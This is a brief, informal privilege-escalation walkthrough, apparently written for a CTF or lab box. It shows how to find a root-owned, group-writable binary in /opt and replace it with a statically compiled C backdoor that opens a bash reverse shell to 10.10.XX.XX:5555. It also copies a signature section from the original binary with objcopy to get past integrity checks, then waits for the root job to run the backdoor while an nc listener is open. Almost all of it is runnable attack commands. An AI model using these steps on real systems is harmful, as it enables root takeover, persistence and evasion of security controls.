You got a remote shell.
you sudo -l and got nothing.
you need to search all the files for a file that you can write and its root's.

1. id
you see if you are in some other groups, maybe devs

2. search for somethinjg like that: 
-rwxrw---- 1 root devs 16544 Jul 27 09:34 monitor

maybe at /opt

3. create a c program there with reverse shell: 
  printf '#include <stdlib.h>\nint main() {\n    system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.XX.XX/5555 0>&1'\''");\n    return 0;\n}\n' > backdoor.c


4. cimpile it:
  gcc -static -o monitor_backdoor backdoor.c

5.  Dump a custom section from the original binary to mimic its structure (to evade integrity checks or signatures):
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor

6.  Add that section to the backdoored binary:
  objcopy --add-section .text_sig=sig monitor_backdoor

7.  Put your code in the file you found.
cp monitor_backdoor /opt/AV/periodic-checks/monitor


and wait for it to get execuded. :)

(dont forget your rlwrap nc -lvnp port)
